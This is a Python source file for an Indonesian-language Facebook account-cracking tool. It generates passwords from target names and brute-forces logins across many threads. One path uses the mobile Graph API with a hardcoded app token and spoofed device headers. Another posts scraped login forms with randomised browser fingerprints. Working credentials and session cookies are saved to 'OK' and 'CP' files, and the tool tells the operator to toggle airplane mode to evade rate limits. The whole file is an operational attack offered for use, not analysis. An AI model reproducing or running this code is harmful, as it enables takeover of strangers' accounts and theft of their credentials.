import time, json, requests, uuid, random, os, string, hashlib

from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from .Password import Pws
from .Module import Tod
from bluid.logo import Logo
from bluid.data import UserAgent

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
R = "\x1b[0;31m" # Merah

class Kynaa:

    def __init__(self, id, aw):
        self.asu, self.asw = id, aw
        self.ses = requests.Session()
        self.ok, self.cp, self.lop = 0, 0, 0

    def save_hasil(self, filename, data):
        with open(filename, "a") as file:
            file.write(data + "\n")

    def print_proses(self, code, gp):
        if code == 200:
            kyna = f"{H}200{N}"
        elif code == 400:
            kyna = f"{R}400{N}"
        elif code == 401:
            kyna = f"{R}401{N}"
        elif code == 403:
            kyna = f"{R}403{N}"
        elif code == 404:
            kyna = f"{R}404{N}"
        elif code == 429:
            kyna = f"{R}429{N}"
        elif code == 500:
            kyna = f"{R}500{N}"
        else:
            kyna = f"{R}{code}{N}"

        print(f"\r[{gp}]-[{kyna}] {str(self.lop)}/{len(self.asu)} OK-:{H}{self.ok}{N} CP-:{K}{self.cp}{N} ", end="")

    def notice(self, tod):
        if tod in "graph_v1":
            kyna = f"{H}         PROSES CRACK METODE GRAPH V1{N}"
        elif tod in "graph_v2":
            kyna = f"{H}         PROSES CRACK METODE GRAPH V2{N}"
        elif tod in "valid_v1":
            kyna = f"{H}         PROSES CRACK METODE VALID V1{N}"
        else:
            kyna = f"{H}         PROSES CRACK METODE VALID V2{N}"
        return kyna

    def abcd(self, asu):
        print(f"\n[!] gunakan , (koma) untuk pemisah contoh : {K}123456,anjing,dll{N}. setiap kata minimal 6 karakter atau lebih")
        pwek = input(f"\n[{H}?{N}] masukan kata sandi tambahan (opsional) : ")
        print(f"[{H}*{N}] sandi tambahan -> [ {H}{pwek}{N} ]")

        user_agent_status = "UserAgent yang disetting" if os.path.exists("data/cache/.sett_UaFB.json") else "UserAgent bawaan script"
        print(f"[{H}#{N}] anda saat ini menggunakan {H}{user_agent_status}{N}")
        time.sleep(3)
        Logo("fesnuk")
        print(self.asw)
        print("     " + self.notice(asu) + "\n"+ "         ---------------------------------------")
        print("             ON-OFF MODE PESAWAT SETIAP 200 ID")
        print("         ---------------------------------------");ips = Tod().get_ip()
        print()
        with ThreadPoolExecutor(max_workers=15) as executor:
            for user in self.asu:
                try:
                    uid, nama, asal = user.split('|')
                    nama = nama.strip()
                    asal = asal.strip()

                    passwords = Pws().generate_passwords(nama, asal, pwek)

                    if "graph_v1" in asu:
                        executor.submit(self.graph_v1, uid, passwords, ips, "GRAPH V1")
                    elif "graph_v2" in asu:
                        executor.submit(self.graph_v1, uid, passwords, ips, "GRAPH V2")
                    elif "valid_v1" in asu:
                        executor.submit(self.reguller, uid, passwords, ips, "https://touch.facebook.com/login.php?", "VALID V1") #"x.facebook.com", "VALID V1")
                    else:
                        executor.submit(self.reguller, uid, passwords, ips, "https://x.facebook.com/login.php?", "VALID V2")

                except ValueError:
                    continue

        exit("\n[#] Cracking selesai.")

#-----------------------   APIIII --------------------------------------

    def generate_key_hash(self):
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))
        key_hash = hashlib.sha256(random_string.encode()).hexdigest()
        return key_hash

    def rand_range(self, start, end):
        return random.randint(start, end)

    def graph_v1(self, user, pasw, ips, note):
        for pw in pasw:
            try:
                ua = UserAgent().ua_facebook("api")
                waterfall_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                group_device_id = str(self.rand_range(1000, 6000))
                device_id = str(uuid.uuid4())
                key_has = self.generate_key_hash()			
                self.ses.headers.update({
                    'host': 'b-graph.facebook.com',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'x-zero-state': 'unknown',
                    'user-agent': ua,
                    'x-tigon-is-retry': 'False',
                    'x-fb-device-group': group_device_id,
                    'x-graphql-request-purpose': 'fetch',
                    'x-fb-privacy-context': '3643298472347298',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                    'x-graphql-client-library': 'graphservice',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-net-hni': '51011',
                    'x-fb-sim-hni': '51011',
                    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'accept-encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Tigon/Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True'
                })
                enpas = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
                data = {
                    'method': "post",
                    'pretty': "false",
                    'format': "json",
                    'server_timestamps': "true",
                    'locale': "id_ID",
                    'purpose': "fetch",
                    'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                    'fb_api_caller_class': "graphservice",
                    'client_doc_id': "119940804214876861379510865434",
                    'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"sim_phones\\\":[],\\\"secure_family_device_id\\\":\\\""+family_device_id+"\\\",\\\"attestation_result\\\":{\\\"data\\\":\\\"eyJjaGFsbGVuZ2Vfbm9uY2UiOiIrZHJubFJJdndKSkxmUnR4TkdLRWlscWRHOUc2KzJPZWdsY1gyN1d0UEEwPSIsInVzZXJuYW1lIjoieHlhZmFqYXJAZ21haWwuY29tIn0=\\\",\\\"signature\\\":\\\"MEQCIDireQS4hTnMyBiyJckHln2WFJ65OU6a31Bx6JGyCjttAiBpZw4ixxyyyNNC0xMgiqmiAd1rVi8ZGsfyTrqvBIibqw==\\\",\\\"keyHash\\\":\\\""+key_has+"\\\"},\\\"has_granted_read_contacts_permissions\\\":0,\\\"auth_secure_device_id\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":1,\\\"password\\\":\\\""+enpas+"\\\",\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"event_flow\\\":\\\"login_manual\\\",\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"sim_serials\\\":[],\\\"client_known_key_hash\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"device_id\\\":\\\""+device_id+"\\\",\\\"login_attempt_count\\\":1,\\\"machine_id\\\":\\\"\\\",\\\"flash_call_permission_status\\\":{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"},\\\"accounts_list\\\":[{},{}],\\\"family_device_id\\\":\\\""+family_device_id+"\\\",\\\"fb_ig_device_id\\\":[],\\\"device_emails\\\":[],\\\"try_num\\\":1,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"event_step\\\":\\\"home_page\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"openid_tokens\\\":{},\\\"contact_point\\\":\\\""+user+"\\\"},\\\"server_params\\\":{\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_from_logged_out\\\":0,\\\"should_trigger_override_login_success_action\\\":0,\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"waterfall_id\\\":\\\""+waterfall_id+"\\\",\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"pw_encryption_try_count\\\":1,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"is_from_landing_page\\\":0,\\\"password_text_input_id\\\":\\\"6vcvjp:102\\\",\\\"is_from_empty_password\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"username_text_input_id\\\":\\\"6vcvjp:101\\\",\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\""+device_id+"\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":4.154659090078E13,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"is_caa_perf_enabled\\\":1,\\\"credential_type\\\":\\\"password\\\",\\\"is_from_password_entry_page\\\":0,\\\"caller\\\":\\\"gslr\\\",\\\"family_device_id\\\":\\\""+family_device_id+"\\\",\\\"is_from_assistive_id\\\":0,\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_login_request"},"scale":"3","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":3,"is_push_on":True,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
                    'fb_api_analytics_tags': '["GraphServices"]',
                    'client_trace_id': str(uuid.uuid4())
                }
                response = self.ses.post(
                    "https://graph.facebook.com/graphql",
                    data=data
                )
                self.print_proses(response.status_code, note)
                if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                    self.ok+=1
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{ua}")
                    break
                elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                    self.cp+=1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}|{ua}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)
            #except Exception as e:
            #    print(e)

        self.lop+=1

    """
    def graph_v2(self, user, pasw, ips):
        for pw in pasw:
            try:
                ua = UserAgent().ua_facebook("api")
                apacoba8 = response.json()
                self.print_proses(response.status_code, "GRAPH V2")
                if "session_key" in apacoba8:
                    self.ok += 1
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
                elif 'User must verify their account' in apacoba8['error']['message']:
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)

        self.lop+=1

    def generate_random_number(self, length):
        return ''.join([str(random.randint(0, 9)) for _ in range(length)])
"""
#-----------------------   VALIDATE --------------------------------------
    """
    def validate(self, user, pasw, ips, host, note):
        ss = requests.Session()
        for pw in pasw:
            try:
                rr = random.randint
                ua = UserAgent().ua_facebook("bkn")
                self.print_proses(kyan.status_code, note)
                if "c_user" in ss.cookies.get_dict().keys():
                    self.ok += 1
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ss.cookies.get_dict().items() ])
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{coki}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{coki}")
                    break
                elif "checkpoint" in ss.cookies.get_dict().keys():
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)

        self.lop+=1
"""
#-----------------------   REGULER --------------------------------------

    def reguller(self, user, pasw, ips, host, note):
        ss = requests.Session()
        for pw in pasw:
            try:
                rr = random.randint
                ua = UserAgent().ua_facebook("bkn")

                kyan = ss.get(host)
                kyna = BeautifulSoup(kyan.text, "html.parser")
                data = {
                    "lsd": kyna.find("input", {"name": "lsd"})["value"],
                    "jazoest": kyna.find("input", {"name": "jazoest"})["value"],
                    "m_ts": kyna.find("input", {"name": "m_ts"})["value"],
                    "li": kyna.find("input", {"name": "li"})["value"],
                    "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": user, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point",
                    "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false",
                    "is_smart_lock": "false", "_fb_noscript": "true", "email": user, "pass": pw
                }

                apcb = ss.cookies.get_dict()
                head = {
                    'authority': 'x.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '1.600000023841858', 'origin': 'https://x.facebook.com', 'referer': 'https://x.facebook.com/', 'accept-encoding': 'br, gzip',
                    'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                    'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                    'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'viewport-width': '980'
                }
                szaz = ss.post(
                    f"https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9",
                    data=data,
                    headers=head,
                    cookies=apcb,
                    allow_redirects=False
                )

                self.print_proses(kyan.status_code, note)
                if "c_user" in ss.cookies.get_dict().keys():
                    self.ok += 1
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ss.cookies.get_dict().items() ])
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{coki}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{coki}")
                    break
                elif "checkpoint" in ss.cookies.get_dict().keys():
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)

        self.lop+=1